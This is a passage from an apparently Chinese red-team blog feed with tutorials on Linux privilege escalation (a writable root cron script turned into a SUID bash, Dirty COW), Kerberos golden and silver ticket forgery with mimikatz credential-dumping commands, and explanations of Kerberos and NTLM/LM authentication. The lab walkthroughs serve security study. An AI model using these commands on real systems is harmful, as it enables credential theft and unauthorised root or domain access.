src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/02.png" alt="创建文件"></p><p>下面我们写一个python程序来删除 /home/cleanup的内容。</p><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmpvi cleanup.py</code></pre><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env python</span>import osimport systry:   os.system(<span class="hljs-string">&#x27;rm -r /root/cleanup/* &#x27;</span>)except:    sys.exit()</code></pre><p><code>chmod 777 cleanup.py</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/03.png" alt="创建文件"></p><p>编辑crontab添加定时任务，每隔2分钟运行一次cleanup.py脚本。</p><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>crontab*<span class="hljs-regexp">/2 *   * * *   root    /</span>tmp/cleanup.py</code></pre><p>下面是运行效果</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/04.png" alt="创建文件"></p><p>在真实环境下普通用户可能无法访问crontab文件，可以用pspy来监听进程。</p><p>pspy是一种命令行工具，无需root权限即可监听进程。可以查看其他用户执行的命令、cron作业等。</p><p>该工具的下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/DominicBreuker/</span>pspy</code></pre><p>首先将pspy上传到目标机器：</p><p>1）chmod +x pspy64s</p><p>2）./pspy64</p><p>观察一段时间，发现/tmp/cleanup.py为root权限执行。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/05.png" alt="pspy64s"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/06.png" alt="pspy64s"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>查看/tmp/cleanup.py权限为普通用户可写</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/07.png" alt="查看权限"></p><p>打开文件，比如vi /tmp/cleanup.py，用下面的命令替换原来命令中的“os.system(‘rm -r /home/cleanup/* ‘)”：</p><pre><code class="hljs clean">os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span>)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/08.png" alt="修改文件"></p><p>2分钟后，tmp目录下就会存在SUID权限的bash，运行<code>/tmp/bash -p </code>后就获取了root权限。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/09.png" alt="利用成功"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/10.png" alt="root权限"></p><p>提权成功。</p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux提权之内核漏洞</title>
    <link href="/p/3574493e.html"/>
    <url>/p/3574493e.html</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Linux目前是最为常见的操作系统，该系统是处于源代码开放状态，信息安全问题也会随之被世界各地的“体验者”揭露出来。</p><p>Linux操作系统的内核是该系列操作系统的“灵魂大脑”，一旦出现安全隐患情况下，攻击者会很对这些安全隐患加以恶意利用，其中Linux内核漏洞是目前攻击者最为热爱的漏洞之一，内核漏洞的利用通常会以“上帝视角”，也就是所谓的操作系统最高权限的形式为攻击者提供对目标系统的超级用户访问权限。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>以Linux内核提权漏洞-“脏牛”来做演示。</p><p>给大家介绍下检查linux提权辅助工具，les该工具主要帮助检测linux内核的安全缺陷。</p><p>下载地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggester</code></pre><p>1.将linux-exploit-suggester.sh下载到要检查的主机上，主要使用以下两条指令：</p><pre><code class="hljs css"><span class="hljs-selector-tag">chmod</span> +<span class="hljs-selector-tag">x</span> <span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span>./<span class="hljs-selector-tag">linux-exploit-suggester</span><span class="hljs-selector-class">.sh</span></code></pre><p>在执行上述命令之前，首先查看Linux内核版本。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/01.png" alt="查看Linux内核版本"></p><p>查看脚本执行结果，可以使用脏牛来进行提权。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/02.png" alt="执行结果"></p><p>2.将漏洞利用代码上传到目标机器，接下来编译并执行。</p><pre><code class="hljs css"><span class="hljs-selector-tag">gcc</span> <span class="hljs-selector-tag">-pthread</span> <span class="hljs-selector-tag">dirty</span><span class="hljs-selector-class">.c</span> <span class="hljs-selector-tag">-o</span> <span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">-lcrypt</span>./<span class="hljs-selector-tag">dirty</span> <span class="hljs-selector-tag">password</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/03.png" alt="编译"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201126_Linux%E6%8F%90%E6%9D%83%E4%B9%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/04.png" alt="运行"></p><p>3.该漏洞利用代码会加入一个uid为0的用户，使用<code>su firefart</code>切换到firefart用户，获取root权限。</p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberos协议之黄金票据和白银票据</title>
    <link href="/p/737303c7.html"/>
    <url>/p/737303c7.html</url>
    
    <content type="html"><![CDATA[<h2 id="Golden-Ticket-黄金票据"><a href="#Golden-Ticket-黄金票据" class="headerlink" title="Golden Ticket(黄金票据)"></a>Golden Ticket(黄金票据)</h2><p>在AS_REQ &amp; AS_REP中，用户使用自身hash加密时间戳发送给KDC，KDC验证成功后返回用krbtgt hash加密的TGT票据。如果我们有krbtgt的hash，就可以自己给自己签发任意用户的tgt票据。</p><p>那么如果获取到了krbtgt的密码hash值，是不是就可以伪造任意tgt了。因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限,黄金凭据可以理解为一个后门</p><h3 id="制作黄金票据的前提条件"><a href="#制作黄金票据的前提条件" class="headerlink" title="制作黄金票据的前提条件"></a>制作黄金票据的前提条件</h3><ul><li>1、krbtgt用户的hash(就意味着你已经有域控制器权限了)    cbcede6976ded273667a8e574a17092f</li><li>2、域名称    secice.cn</li><li>3、域的SID值    S-1-5-21-1431134449-3516206009-3475222595</li><li>4、要伪造的用户名(可以是任意用户甚至是不存在的用户)</li></ul><h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>先登录域控制器，dump krbtgt用户的hash值,获取域sid：</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># lsadump::dcsync /domain:secice.cn /user:krbtgt//导出 krbtgt 密码 hash</span>也可以mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:secice.cn /user:krbtgt&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt<span class="hljs-regexp">//</span>将导出的信息保存在<span class="hljs-number">1</span>.txt中</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/01.png" alt="黄金票据利用"></p><p>切换到普通域用户的机器，生成TGT凭证,用户名随意:</p><pre><code class="hljs awk">mimikatz <span class="hljs-comment"># kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt</span>也可以mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /rc4:cbcede6976ded273667a8e574a17092f /user:aaa /ptt&quot;</span> <span class="hljs-string">&quot;kerberos::list&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/02.png" alt="黄金票据利用"></p><blockquote><p>注:普通黄金票据不能跨域使用;TGT 有效时间为 20 分钟;。分钟;。</p></blockquote><h2 id="Silver-Ticket-白银票据"><a href="#Silver-Ticket-白银票据" class="headerlink" title="Silver Ticket(白银票据)"></a>Silver Ticket(白银票据)</h2><p>白银票据是出现在TGS_REQ &amp; TGS_REP过程中的。在TGS_REP中，不管Client是否有权限访问特殊服务，只要Client发送的TGT票据是正确的，那么就会返回服务hash加密的tgs票据。如果我们有了服务hash，就可以签发tgs票据。</p><h3 id="伪造白银票据的前提条件"><a href="#伪造白银票据的前提条件" class="headerlink" title="伪造白银票据的前提条件"></a>伪造白银票据的前提条件</h3><ul><li>1、域名称        secice.cn</li><li>2、域的 SID    S-1-5-21-1431134449-3516206009-3475222595</li><li>3、域的服务账号的密码 hash    f4bf5c36403ccc692e0bc5cf7f82a72a</li><li>4、伪造的用户名(可以是任意的)</li></ul><p>白银票据这里只是对单一的服务进行授权，利用过程和golden ticket差不多，首先上域控制器中，把机器的ntlm hash(rc4加密) dump下来,然后在普通域用户机器进行伪造权限,进行ptt.</p><h3 id="白银票据利用"><a href="#白银票据利用" class="headerlink" title="白银票据利用"></a>白银票据利用</h3><p>首先登录域控，dump机器hash</p><pre><code class="hljs awk">privilege::debugsekurlsa::logonpasswords也可以mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span> &gt;&gt; <span class="hljs-number">1</span>.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/03.png" alt="白银票据利用"></p><p>将hash和SID保存下来，在普通域用户机器中进行ptt（在黄金票据中我们可以不指定 target 和 service，但是在白银票据中必须指定 target 和 service）</p><pre><code class="hljs awk">mimikatz.exe privilege::debug <span class="hljs-string">&quot;kerberos::golden /domain:secice.cn /sid:S-1-5-21-1431134449-3516206009-3475222595 /target:DC.secice.cn /service:cifs /rc4:f4bf5c36403ccc692e0bc5cf7f82a72a /user:aaa /ptt&quot;</span> <span class="hljs-keyword">exit</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/04.png" alt="白银票据利用"></p><p>这里的cifs是指的文件共享服务，有了cifs服务权限，就可以访问域控制器的文件系统:</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/05.png" alt="白银票据利用"></p><p>不仅仅是cifs服务还有其他：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201125_Kerberos%E5%8D%8F%E8%AE%AE%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/06.png" alt="白银票据利用"></p><p>ldap可以用来dcsync</p><h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><ol><li>访问权限不同<br>Golden Ticket: 伪造 TGT,可以获取任何 Kerberos 服务权限<br>Silver Ticket: 伪造 TGS,只能访问指定的服务</li><li>加密方式不同<br>Golden Ticket 由 krbtgt 的 Hash 加密<br>Silver Ticket 由服务账号(通常为计算机账户)Hash 加密</li><li>认证流程不同<br>Golden Ticket 的利用过程需要访问域控,而 Silver Ticket 不需要</li></ol>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透之Kerberos协议</title>
    <link href="/p/fe98a932.html"/>
    <url>/p/fe98a932.html</url>
    
    <content type="html"><![CDATA[<h2 id="Kerberos-协议简介"><a href="#Kerberos-协议简介" class="headerlink" title="Kerberos 协议简介"></a>Kerberos 协议简介</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址 的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意的读取、 修改和插入数据。在以上情况下，Kerberos 作为一种可信任的第三方认证服务，是通过传统 的密码技术(如:共享密钥)执行认证服务的。</p><h2 id="Kerberos-协议框架"><a href="#Kerberos-协议框架" class="headerlink" title="Kerberos 协议框架"></a>Kerberos 协议框架</h2><p>Kerberos 协议中主要有三个角色:</p><ul><li>访问服务的 Client</li><li>提供服务的 Server</li><li>KDC(Key Distribution Center)密钥分发中心</li></ul><p>KDC 默认安装在域控中，而 Client 和 Server 为域内的用户或者服务，如 web 应用、数</p><p>据库服务器和邮件服务器等。Client 是否有权限访问 Server 端的服务由 KDC 发放的票据来 决定。</p><p>如果把 Kerberos 中的票据比作一张火车票，那么 Client 端就是乘客，Server 就是火车， 而 KDC 就是火车站的认证系统。如果 Client 端的票据是合法的(由你本人身份证购买并且 由你本人持有)同时有访问 Server 端服务的权限(车票对应车次正确)那么你才能上车。当 然和火车票不同的是 Kerberos 中有两张票据，而火车票只有一张。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/01.png" alt="Kerberos 协议框架"></p><p>由上图可以看出，KDC 又分为两个部分:</p><blockquote><p>Authentication Server:</p></blockquote><p>AS 的作用就是验证 Client 的身份(确认你是身份证上的本人)，</p><p>验证通过就给一张 TGT(Ticket Granting Ticket)票给 Client。</p><blockquote><p>Ticket Granting Server:</p></blockquote><p>TGS 的作用就是通过 AS 发给 Client 的票(TGT)换取访问 Server</p><p>端的票 ST(Server Ticket)。ST 也有资料称之为 TGS Ticket。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/02.png" alt="Kerberos 协议框架"></p><h2 id="Kerberos-认证流程"><a href="#Kerberos-认证流程" class="headerlink" title="Kerberos 认证流程"></a>Kerberos 认证流程</h2><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块:</p><ul><li>The Authentication Service Exchange: Client 与 AS 的交互</li><li>The Ticket Granting Service Exchange:Client 与 TGS 的交互</li><li>The Client/Server Authentication Exchange:Client 与 Server 的交互</li></ul><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/03.png" alt="Kerberos 认证流程"></p><h4 id="1-The-Authentication-Service-Exchange"><a href="#1-The-Authentication-Service-Exchange" class="headerlink" title="(1) The Authentication Service Exchange"></a>(1) The Authentication Service Exchange</h4><h5 id="KRB-AS-REQ"><a href="#KRB-AS-REQ" class="headerlink" title="KRB_AS_REQ:"></a>KRB_AS_REQ:</h5><blockquote><p>Client-&gt;AS:发送 Authenticator1(Client 密码加密 TimeStamp)</p></blockquote><p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1,内容为通过 Client 密码 hash 加密的时间戳、Client ID、网络地址、加密类型等内容。</p><h5 id="KBR-AS-REP"><a href="#KBR-AS-REP" class="headerlink" title="KBR_AS_REP:"></a>KBR_AS_REP:</h5><blockquote><p>AS-&gt;Client:发送 Client 密码加密的 sessionkey-as 和票据 TGT(KBRTGT HASH 加密的 sesionkey-as 和 Timestamp)</p></blockquote><p>在 KDC 中存储了域中所有用户的密码 hash，当 AS 接受到 Client 的请求后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 hash 加密的 sessionkey-as 和 TGT(由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信 息)。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/04.png" alt="The Authentication Service Exchange"></p><h4 id="2-The-Ticket-Granting-Service-TGS-Exchange"><a href="#2-The-Ticket-Granting-Service-TGS-Exchange" class="headerlink" title="(2) The Ticket Granting Service(TGS) Exchange"></a>(2) The Ticket Granting Service(TGS) Exchange</h4><h5 id="KBR-TGS-REQ"><a href="#KBR-TGS-REQ" class="headerlink" title="KBR_TGS_REQ:"></a>KBR_TGS_REQ:</h5><blockquote><p>Client-&gt;TGS 发送 Authenticator2(sessionkey-as 加密 timestamp)和票据 TGT(KBRTGT HASH 加密的 sessionkey-as 和 timestamp)</p></blockquote><p>Client 接收到了加密的 sessionkey-as 和 TGT 后，用自身的密码解密得到 sessionkey-as， TGT 是 KDC 密码加密的，Client 无法解密。这时 Client 再用 sessionkey-as 加密 timestamp 和 TGT 一起发送给 KDC 中的 TGS(Ticket Granting Server)票据授权服务器换取能够访问 Server 的票据。</p><h5 id="KBR-TGS-REP"><a href="#KBR-TGS-REP" class="headerlink" title="KBR_TGS-REP:"></a>KBR_TGS-REP:</h5><blockquote><p>TGS-&gt;Client:发送密文(由 sessionkey-as 加密的 sessionkey-tgs)和票据 ST(由 server 密 码 hash 加密的 sessionkey-tgs)</p></blockquote><p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检 查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情 况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址 相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/05.png" alt="The Ticket Granting Service(TGS) Exchange"></p><h4 id="3-The-Client-Server-Authentication-Exchange"><a href="#3-The-Client-Server-Authentication-Exchange" class="headerlink" title="(3) The Client/Server Authentication Exchange"></a>(3) The Client/Server Authentication Exchange</h4><h5 id="KBR-AP-REQ"><a href="#KBR-AP-REQ" class="headerlink" title="KBR_AP_REQ:"></a>KBR_AP_REQ:</h5><blockquote><p>Client-&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 timestamp)和票据 ST(Server 密码 hash 加密的 sessionkey-tgs)</p></blockquote><p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 hash 加密的 sessionkey- tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 timestamp 和 ST 一起发送给 Server。</p><h5 id="KBR-AP-REP"><a href="#KBR-AP-REP" class="headerlink" title="KBR_AP_REP:"></a>KBR_AP_REP:</h5><blockquote><p>Server-&gt;Client :</p></blockquote><p>Server 通过自己的密码解密 ST，得到 sessionkey-tgs，再用 sessionkey-tgs 解密 Authenticator3 得到 timestamp，验证正确返回验证成功。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201123_%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/06.png" alt="The Client/Server Authentication Exchange"></p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>彻底理解Windows认证</title>
    <link href="/p/fe98a932.html"/>
    <url>/p/fe98a932.html</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-本地认证"><a href="#0x00-本地认证" class="headerlink" title="0x00 本地认证"></a>0x00 本地认证</h2><h3 id="本地认证基础知识"><a href="#本地认证基础知识" class="headerlink" title="本地认证基础知识"></a>本地认证基础知识</h3><p>在本地登录Windows的情况下，操作系统会使用用户输入的密码作为凭证去与系统中的密码进行验证，但是操作系统中的密码存储在哪里呢？</p><p><code>%SystemRoot%\system32\config\sam</code></p><p>当我们登录系统的时候,系统会自动地读取SAM文件中的“密码”与我们输入的“密码”进行比对，如果相同，证明认证成功!</p><p>这个SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库。</p><p>上面认证的过程只是粗略的说法，整个认证过程并没有那么简单，从操作系统的角度来看，还是需要铺垫很多概念的。</p><p><strong>Windows本身不保存明文密码，只保留密码的Hash。</strong></p><blockquote><p>Hash，一般翻译做“散列”，也有直接音译为“哈希”的，就是把任意长度的输入（又叫做预映射pre-image）通过散列算法变换成固定长度的输出，该输出就是散列值。这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。 – Baidu</p></blockquote><p>为了保证存储的不是明文，从而采用Hash，但是密码Hash也需要特定的生成算法以及表现形式。</p><h3 id="NTLM-Hash与NTLM"><a href="#NTLM-Hash与NTLM" class="headerlink" title="NTLM Hash与NTLM"></a>NTLM Hash与NTLM</h3><p>在Windows中，密码Hash目前称之为NTLM Hash，其中NTLM全称是：“NT LAN Manager”。</p><p>这个NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。</p><p>也就是说，NTLM与NTLM Hash相互对应。</p><p>在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p><h3 id="NTLM-Hash的产生"><a href="#NTLM-Hash的产生" class="headerlink" title="NTLM Hash的产生"></a>NTLM Hash的产生</h3><p>假设我的密码是admin，那么操作系统会将admin转换为十六进制，经过Unicode转换后，再调用MD4加密算法加密，这个加密结果的十六进制就是NTLM Hash。</p><pre><code class="hljs apache"><span class="hljs-attribute">admin</span> -&gt; hex(<span class="hljs-number">16</span>进制编码) = <span class="hljs-number">61646</span>d<span class="hljs-number">696</span>e<span class="hljs-attribute">61646d696e</span> -&gt; Unicode = <span class="hljs-number">610064006</span>d<span class="hljs-number">0069006</span>e<span class="hljs-number">00</span><span class="hljs-attribute">610064006d0069006e00</span> -&gt; MD<span class="hljs-number">4</span> = <span class="hljs-number">209</span>c<span class="hljs-number">6174</span>da<span class="hljs-number">490</span>caeb<span class="hljs-number">422</span>f<span class="hljs-number">3</span>fa<span class="hljs-number">5</span>a<span class="hljs-number">7</span>ae<span class="hljs-number">634</span></code></pre><h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">winlogon</span>.exe -&gt;</span> 接收用户输入 -&gt; <span class="hljs-function"><span class="hljs-title">lsass</span>.exe -&gt;</span> (认证)</code></pre><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库比较认证。</p><ul><li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li></ul><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>在NTLM协议问世之前，它对前身就是LM（LAN Manager）协议。</p><p><strong>LM与NTLM协议的认证机制相同，但是加密算法不同。</strong></p><p>目前大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。</p><p>LM协议认证过程中需要LM Hash作为根本凭证进行参与认证，下面就简述一些LM Hash的产生：</p><pre><code class="hljs subunit">将所有小写字母转换为大写字母• &gt;123ABC // 未达到7个字符• 将密码转化为16进制，分两组，填充为14个字符,空余位使用0x00字符填补• &gt;31323341424300000000000000• 将密码分割为两组7个字节的块• &gt;31323341424300 00000000000000 // 16进制• 将每组转化为比特流，不足56Bit则在左边加0• &gt;31323341424300 -&gt;(转换为二进制) 110001001100100011001101000001010000100100001100000000-&gt; (补 足56Bit) 00110001001100100011001101000001010000100100001100000000• 将比特流按照7比特一组，分出8组，末尾加0由于后者都为0，结果可想而知，那就都是0;• 将每组比特流转换为16进制作为被加密的值，使用DES加密，字符串 “KGS!@#$%”为Key(0x4B47532140232425)，得到8个结果 ，每个 结果转换为16进制。• -&gt; 00110000100110001000110001101000000101000001001000001100 00000000• -&gt;30988C6814120C00 -&gt; DES(30988C6814120C00) -&gt; 48-D7-EB<span class="hljs-string">-91</span>- 2F<span class="hljs-string">-5</span>E<span class="hljs-string">-69</span><span class="hljs-string">-7</span>C• 由于我们的密码不超过7字节，所以后面的一半是固定的:• AA-D3-B4<span class="hljs-string">-35</span>-B5<span class="hljs-string">-14</span><span class="hljs-string">-04</span>-EE• 连接两个DES加密字符串。这是LM哈希。• 48-D7-EB<span class="hljs-string">-91</span><span 